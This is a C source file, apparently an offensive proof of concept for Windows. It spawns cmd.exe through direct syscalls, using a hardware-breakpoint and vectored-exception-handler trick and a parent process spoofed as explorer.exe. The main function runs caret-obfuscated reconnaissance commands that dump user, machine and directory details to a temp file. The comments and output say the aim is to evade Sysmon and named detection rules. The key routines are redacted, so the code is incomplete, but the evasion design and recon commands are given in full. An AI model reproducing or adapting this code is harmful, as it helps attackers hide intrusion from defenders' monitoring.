#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdint.h>

/* ─── NT types ───────────────────────────────────────────────────────────── */
typedef LONG    NTSTATUS;
typedef ULONG   ACCESS_MASK;
#define NT_SUCCESS(s)               ((NTSTATUS)(s) >= 0)
#define PROCESS_ALL_ACCESS          (0x001F0FFF)
#define THREAD_ALL_ACCESS           (0x001FFFFF)
#define PROCESS_CREATE_PROCESS      (0x0080)
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x01

/* ─── PS_ATTRIBUTE ───────────────────────────────────────────────────────── */
#define PS_ATTRIBUTE_PARENT_PROCESS  0x60000ULL
#define PS_ATTRIBUTE_IMAGE_NAME      0x20005ULL
#define PS_ATTRIBUTE_CLIENT_ID       0x10003ULL

typedef struct _PS_ATTRIBUTE {
    ULONG_PTR  Attribute;
    SIZE_T     Size;
    union { ULONG_PTR Value; PVOID ValuePtr; };
    PSIZE_T    ReturnLength;
} PS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[3];
} PS_ATTRIBUTE_LIST;

typedef enum _PS_CREATE_STATE {
    PsCreateInitialState = 0,
    PsCreateFailOnFileOpen, PsCreateFailOnSectionCreate,
    PsCreateFailExeFormat,  PsCreateFailMachineMismatch,
    PsCreateFailExeName,    PsCreateSuccess, PsCreateMaximumStates
} PS_CREATE_STATE;

typedef struct _PS_CREATE_INFO {
    SIZE_T          Size;
    PS_CREATE_STATE State;
    union {
        struct { union { ULONG InitFlags; }; ACCESS_MASK AdditionalFileAccess; } InitState;
        struct { union { ULONG OutputFlags; }; HANDLE FileHandle; HANDLE SectionHandle;
                 ULONGLONG UserProcessParametersNative; ULONG UserProcessParametersWow64;
                 ULONG CurrentParameterFlags; ULONGLONG PebAddressNative;
                 ULONG PebAddressWow64; ULONGLONG ManifestAddress; ULONG ManifestSize;
        } SuccessState;
    };
} PS_CREATE_INFO;
typedef PS_CREATE_INFO *PPS_CREATE_INFO;

typedef NTSTATUS (WINAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS*, PUNICODE_STRING, PUNICODE_STRING,
    PUNICODE_STRING, PUNICODE_STRING, PVOID, PUNICODE_STRING,
    PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, ULONG);
typedef VOID (WINAPI *RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);

typedef NTSTATUS (WINAPI *NtCreateUserProcess_t)(
    PHANDLE, PHANDLE, ACCESS_MASK, ACCESS_MASK,
    OBJECT_ATTRIBUTES*, OBJECT_ATTRIBUTES*,
    ULONG, ULONG,
    PRTL_USER_PROCESS_PARAMETERS, PPS_CREATE_INFO, PS_ATTRIBUTE_LIST*);
typedef NTSTATUS (WINAPI *NtResumeThread_t)(HANDLE, PULONG);

/* ─── Globals ────────────────────────────────────────────────────────────── */
static BOOL  g_veh_fired               = FALSE;
static DWORD g_ssn_NtCreateUserProcess = 0;
static DWORD g_ssn_NtResumeThread      = 0;
static HANDLE g_hExplorer              = NULL;

/* ─── SSN Resolution ─────────────────────────────────────────────────────── */
static DWORD ResolveSyscallNumber(const char* name) {
    /* [REDACTED :D] */
    return ssn;
}

/* ─── Runtime syscall stub ───────────────────────────────────────────────── */
static void* MakeStub(DWORD ssn) {
    /* [REDACTED :D] */
    return mem;
}

/* ─── Find and open explorer.exe ─────────────────────────────────────────── */
static HANDLE FindAndOpenExplorer(void) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return NULL;

    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    HANDLE hExplorer = NULL;

    /* [REDACTED :D] */
    CloseHandle(hSnap);
    return hExplorer;
}

/* ─── Core: spawn with spoofed PPID, no external binaries in payload ─────── */
static BOOL SpawnNoChildProcess(HANDLE hFakeParent, const wchar_t* cmdline,
                                const char* label) {
    printf("\n[VEH] Spawning: %s\n", label);
    wprintf(L"[VEH] Cmdline: %s\n", cmdline);

    /* [REDACTED :D] */
    return TRUE;
}

/* ─── HWBP target ────────────────────────────────────────────────────────── */
static void __attribute__((noinline)) HwbpTarget(void) {
    __asm__ volatile ("nop");
}

/* ─── VEH ────────────────────────────────────────────────────────────────── */
static LONG WINAPI VehHandler(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;
    if (!(ep->ContextRecord->Dr6 & 0x1))
        return EXCEPTION_CONTINUE_SEARCH;
    if (g_veh_fired)
        return EXCEPTION_CONTINUE_SEARCH;
    g_veh_fired = TRUE;

    printf("[VEH] HWBP fired at RIP=0x%llx\n",
           (unsigned long long)ep->ContextRecord->Rip);
    ep->ContextRecord->Dr7 = 0;
    ep->ContextRecord->Dr6 = 0;

    /*
     * Payload A — pure environment variable expansion
     *
     * %USERNAME%, %COMPUTERNAME%, %USERDOMAIN% are resolved entirely
     * inside cmd.exe's own process — no child process, no Sysmon Event ID 1.
     * The output is written to a temp file to survive the console window
     * closing. Read it on the host with: type C:\Windows\Temp\out.txt
     *
     * Sysmon sees: cmd.exe spawned (1 Event ID 1), nothing else.
     */
    SpawnNoChildProcess(
        g_hExplorer,
        L"cmd.exe /C echo user=%USERNAME% computer=%COMPUTERNAME%"
        L" domain=%USERDOMAIN% arch=%PROCESSOR_ARCHITECTURE%"
        L" > C:\\Windows\\Temp\\out.txt",
        "A: Env var expansion (no child process)"
    );
    Sleep(1500);

    /*
     * Payload B — caret-obfuscated, still env vars only
     *
     * The Sysmon log will show the raw caret-escaped string as commandLine,
     * making content matching even harder. No external binary is launched.
     */
    SpawnNoChildProcess(
        g_hExplorer,
        L"cmd.exe /C ec^ho user=%U^SERNA^ME% comp=%COMP^UTER^NAME%"
        L" >> C:\\Windows\\Temp\\out.txt",
        "B: Caret-obfuscated env var recon"
    );
    Sleep(1500);

    /*
     * Payload C — dir listing (built-in, no child process)
     *
     * dir is a cmd.exe built-in command. It enumerates the filesystem
     * without spawning any external binary. Useful for checking whether
     * specific files or tools exist on the target without leaving
     * a process creation event.
     */
    SpawnNoChildProcess(
        g_hExplorer,
        L"cmd.exe /C dir C:\\Users\\ >> C:\\Windows\\Temp\\out.txt",
        "C: dir built-in (filesystem recon, no child)"
    );

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* ─── main ───────────────────────────────────────────────────────────────── */
int main(void) {
    printf("=== Full Combo + PPID Spoof + No Child Process ===\n\n");

    printf("[*] Resolving SSNs...\n");
    g_ssn_NtCreateUserProcess = ResolveSyscallNumber("NtCreateUserProcess");
    g_ssn_NtResumeThread      = ResolveSyscallNumber("NtResumeThread");
    if (g_ssn_NtCreateUserProcess == (DWORD)-1 ||
        g_ssn_NtResumeThread      == (DWORD)-1) {
        fprintf(stderr, "[-] SSN resolution failed\n");
        return 1;
    }
    printf("[*] NtCreateUserProcess = 0x%X\n", g_ssn_NtCreateUserProcess);
    printf("[*] NtResumeThread      = 0x%X\n\n", g_ssn_NtResumeThread);

    printf("[*] Locating explorer.exe...\n");
    g_hExplorer = FindAndOpenExplorer();
    if (!g_hExplorer) {
        fprintf(stderr, "[-] Could not open explorer.exe\n");
        return 1;
    }

    printf("[*] Registering VEH...\n");
    PVOID hVeh = AddVectoredExceptionHandler(1, VehHandler);
    if (!hVeh) return 1;

    printf("[*] Arming DR0 HWBP on HwbpTarget...\n");
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr0 = (DWORD64)(uintptr_t)HwbpTarget;
    ctx.Dr6 = 0;
    ctx.Dr7 = 0x00000001;
    SetThreadContext(GetCurrentThread(), &ctx);

    printf("[*] Triggering HWBP -> VEH -> NtCreateUserProcess...\n");
    HwbpTarget();

    RemoveVectoredExceptionHandler(hVeh);
    CloseHandle(g_hExplorer);

    printf("\n[*] Output written to C:\\Windows\\Temp\\out.txt\n");
    printf("    Read it with: type C:\\Windows\\Temp\\out.txt\n\n");
    printf("  Rule 92052 (abnormal parent)   -> SILENT (parent=explorer.exe)\n");
    printf("  Rule 92032 (suspicious binary) -> SILENT (no child processes)\n");
    printf("  Sysmon Event ID 1 count        -> 3 (one cmd.exe per payload,\n");
    printf("                                    zero children per cmd.exe)\n");
    printf("\nIf any rule fires, check which field triggered it in the alert\n");
    printf("and what the exact regex in the rule matches against\n");
    return 0;
}
